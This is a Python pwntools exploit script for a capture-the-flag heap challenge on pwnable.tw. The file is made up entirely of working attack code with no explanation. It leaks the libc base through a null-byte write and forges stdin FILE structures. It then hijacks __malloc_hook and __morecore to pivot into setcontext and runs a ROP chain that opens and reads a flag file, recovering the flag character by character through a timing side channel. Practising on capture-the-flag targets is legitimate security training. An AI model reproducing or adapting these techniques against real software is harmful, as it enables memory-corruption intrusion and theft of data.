from pwn import *
import time
import string

libc = ELF('./libc-4e5dfd832191073e18a09728f68666b6465eeacd.so')

def get_libc_base(io):
    mmap_size = 0x314000
    max_mmap_size = 0x313370
    null_byte_offset = libc.sym['_IO_2_1_stdin_'] + mmap_size - 0x10 + 0x38
    fix_offset = 0x3c3741

    try:
        io.recvuntil('Size :')
        io.sendline(str(null_byte_offset))
        io.recvuntil('Size :')
        io.sendline(str(max_mmap_size))
        io.recvuntil('Content :')
        io.send('A')

        io.recvuntil('> ')
        io.send(b'F')

        io.recvuntil('> ')
        io.send(b'\xa0')
        io.recvuntil('> ')
        io.send(b'A')
        io.recvuntil('key :')
        io.send(b'1')
        io.wait(0.1)
        io.send(b'\n')
        io.recvuntil('data :')
        io.send(b'A' * 0x1)

        io.recvuntil('> ')
        io.send(b'\xa0')
        io.recvuntil('> ')
        io.send(b'A')
        io.recvuntil('key :')
        io.send(b'3')
        io.wait(0.1)
        io.send(b'\n')
        io.recvuntil('data :')
        io.send(b'A' * 0x1)

        io.recvuntil('> ')
        io.send(b'\xa0')
        io.recvuntil('> ')
        io.send(b'A')
        io.recvuntil('key :')
        io.send(b'2')
        io.wait(0.1)
        io.send(b'\n')
        io.recvuntil('data :')
        io.send(b'A')

        io.recvuntil('> ')
        io.send(b'R')
        io.recvuntil('key:')
        io.send(b'2')
        io.wait(0.1)
        io.send(b'\n')
        io.recvuntil('data : ')
        libc_leak = u64(io.recv(0x6) + b'\0\0')
    except:
        io.wait(1)
        io.close()
        return 0
    return libc_leak - fix_offset

def gen_payload(index, guess_char):
    call_morecore = libc.address + 0x843e1
    mov_rdi_rax = libc.address + 0x76006
    setcontext_init = libc.sym['setcontext'] + 0x2e

    pop_rax = libc.address + 0x3a998
    fake_rsp_addr = libc.address + 0x3c2708
    flag_file_addr = libc.address + 0x3c2820
    O_RDONLY = 0x0

    ret = pop_rax
    rbx = 0
    rcx = 0
    rdx = 0
    rdi = flag_file_addr
    rsi = O_RDONLY
    rsp = fake_rsp_addr

    # _IO_2_1_stdin_
    payload = p64(libc.sym['_IO_2_1_stdin_'] + 0x1000) + p64(0) * 5 + p64(0x1000000000) + p64(0xffffffffffffffff) + p64(0)
    payload += p64(libc.address + 0x3c3770) + p64(0xffffffffffffffff) + p64(0) + p64(libc.address + 0x3c19a0)
    payload += p64(0) * 3 + p64(0xffffffff) + p64(0) * 2 + p64(libc.sym['_IO_file_jumps']) + p64(0) * 38
    payload += p64(libc.sym['_IO_wfile_jumps']) + p64(0) + p64(libc.address + 0x88680) + p64(libc.address + 0x88260)

    # overwrite __malloc_hook -> __morecore
    payload += p64(call_morecore) + p64(0)

    # heap
    payload += p64(0x100000000) + p64(0) * 10 + p64(libc.sym['_IO_2_1_stdin_'] + 0x1740) + p64(0)
    for addr in range(libc.address + 0x3c1b58, libc.address + 0x3c2348, 0x10):
        payload += p64(addr) * 2
    payload += p64(0) * 2 + p64(libc.address + 0x3c1b00) + p64(0) + p64(1) + p64(0x21000) * 2

    # overwirte __morecore -> setcontext
    payload += p64(mov_rdi_rax) + p64(setcontext_init) + p64(libc.address + 0x18c04e) * 2 + p64(0) * 2
    payload += p64(0) + p64(1) + p64(2) + p64(libc.address + 0x3c4498) + p64(0) + p64(0xffffffffffffffff)

    # setcontext
    payload += p64(libc.address + 0x3c05a0) + p64(rdi) + p64(rsi)
    payload += p64(libc.address + 0x3bec20) + p64(rbx) + p64(rdx)
    payload += p64(libc.address + 0x3bea60) + p64(rcx) + p64(rsp) + p64(ret)
    payload += p64(libc.address + 0x3bf0c0) + p64(libc.address + 0x3bf140) + p64(libc.address + 0x3bf200)
    payload += p64(libc.address + 0x3bf280) + p64(libc.address + 0x3bf2e0) + p64(libc.address + 0x175860)
    payload += p64(libc.address + 0x174960) + p64(libc.address + 0x174f60) + p64(libc.address + 0x18c86c) * 13
    payload += p64(0) * 3 + p64(libc.sym['_IO_2_1_stderr_']) + p64(0) * 3

    # preserve_IO_2_1_stderr_
    payload += p64(0xfbad2086) + p64(0) * 12 + p64(libc.address + 0x3c2600) + p64(2) + p64(0xffffffffffffffff)
    payload += p64(0) + p64(libc.address + 0x3c3750) + p64(0xffffffffffffffff) + p64(0)
    payload += p64(libc.address + 0x3c1640) + p64(0) * 6 + p64(libc.address + 0x3be400)

    # preserve _IO_2_1_stdout_
    payload += p64(0xfbad28a7) + p64(libc.address + 0x3c2683) * 7 + p64(libc.address + 0x3c2684)
    payload += p64(0) * 4 + p64(libc.address + 0x3c18c0) + p64(1) + p64(0xffffffffffffffff)
    payload += p64(0) + p64(libc.address + 0x3c3760) + p64(0xffffffffffffffff) + p64(0) + p64(libc.address + 0x3c1780)
    payload += p64(0) * 3 + p64(0xffffffff) + p64(0) * 2 + p64(libc.address + 0x3be400)

    # stderr & stdout & stdin
    payload += p64(libc.address + 0x3c2520) + p64(libc.address + 0x3c2600)
    payload += p64(libc.address + 0x3c18c0) + p64(libc.address + 0x20730)

    read_syscall_num = 0x0
    write_syscall_num = 0x1
    open_syscall_num = 0x2
    exit_syscall_num = 0x3c
    syscall = libc.address + 0xbc765
    pop_rdi = libc.address + 0x1fd7a
    pop_rsi = libc.address + 0x1fcbd
    pop_rdx = libc.address + 0x1b92
    pop_rcx = libc.address + 0x1a97b8
    flag_fd = 0x1
    flag_addr = flag_file_addr + 0x20
    guess_char_addr = flag_file_addr + 0x40
    flag_length = 0x40
    strchr_addr = libc.address + 0x8bdc0
    mov_eax_dword_ptr_rax = libc.address + 0x116679
    mov_cl_dword_ptr_rax = libc.address + 0x115af0
    mov_qword_ptr_rdi_rcx = libc.address + 0x9192f
    STDIN_FILENO = 0x0
    push_rax = libc.address + 0x5988
    # rop

    # open("/home/wannaheap/flag", O_RDONLY)
    rop = p64(0) + p64(open_syscall_num)
    rop += p64(syscall)
    # read(fd, flag_addr, flag_length)
    rop += p64(pop_rax) + p64(read_syscall_num)
    rop += p64(pop_rdi) + p64(flag_fd)
    rop += p64(pop_rsi) + p64(flag_addr)
    rop += p64(pop_rdx) + p64(flag_length)
    rop += p64(syscall)
    # guess byte using time based method
    rop += p64(pop_rcx) + p64(0)
    rop += p64(pop_rax) + p64(flag_addr + 0x7d + index)
    rop += p64(mov_cl_dword_ptr_rax)
    rop += p64(pop_rdi) + p64(guess_char_addr)
    rop += p64(mov_qword_ptr_rdi_rcx)
    rop += p64(pop_rdi) + p64(guess_char_addr)
    rop += p64(pop_rsi) + p64(ord(guess_char))
    rop += p64(strchr_addr)
    rop += p64(mov_eax_dword_ptr_rax)
    rop += p64(pop_rax) + p64(push_rax)
    rop += p64(push_rax)

    rop = rop.ljust(0x120, b'\0') + b'/home/wannaheap/flag\0'
    payload += rop

    return payload

flag = ''

for index in range(0, 48):
    found = False
    for guess_char in string.printable:

        # avoid A and E
        if guess_char == 'A' or guess_char == 'E':
            continue

        while True:
            io = remote('chall.pwnable.tw', 10305)

            libc.address = get_libc_base(io)

            if libc.address == 0:
                continue
            
            payload = gen_payload(index, guess_char)

            if b'A' in payload or b'E' in payload:
                io.wait(1)
                io.close()
                continue

            try:
                io.send(p64(libc.sym['_IO_2_1_stdin_'] + 0x1000))
                io.wait(1)
                io.send(payload)
                io.wait(1)
                io.send(b'A')
                io.wait(0.1)
                io.send(b'4')
                io.wait(0.1)
                io.send(b'\n')
            except:
                io.wait(1)
                io.close()
                continue

            init_time = time.time()
            io.stream()
            fini_time = time.time()

            if fini_time - init_time > 1:
                flag += guess_char
                found = True
                print(flag)

            io.close()

            break

        if found:
            break

    if not found:
        flag += '?'

print(flag)
